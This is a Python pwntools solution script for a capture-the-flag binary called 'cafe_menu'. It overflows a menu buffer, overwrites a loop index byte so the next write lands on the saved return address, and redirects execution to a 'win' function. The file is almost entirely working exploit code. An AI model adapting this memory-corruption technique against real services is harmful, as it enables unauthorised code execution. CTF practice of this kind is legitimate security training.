#!/usr/bin/env python3
from pwn import *

exe = ELF('cafe_menu', checksec=False)
context.os = 'linux'
context.binary = exe
context.arch = 'amd64'

HOST, PORT = 'offsec.m0lecon.it', 13600

OFFSET_TO_RIP = 72
GADGET = 0x000000000040101a

def conn():
    if args.LOCAL:
        r = process(exe.path)
    else:
        r = remote(HOST, PORT)
    return r

def main():
    r = conn()

    r.recvuntil(b'Enter today\'s specials (send 0xff to finish):')

    payload = b'A' * 48  # fill menu completely
    payload += b'\x47'  # overwrite idx low byte → after idx++, idx=72
    payload += p64(exe.sym.win)  # written directly to saved RIP
    payload += b'\xff'  # terminate the loop

    r.send(payload)
    r.interactive()


    r.interactive()


if __name__ == '__main__':
    main()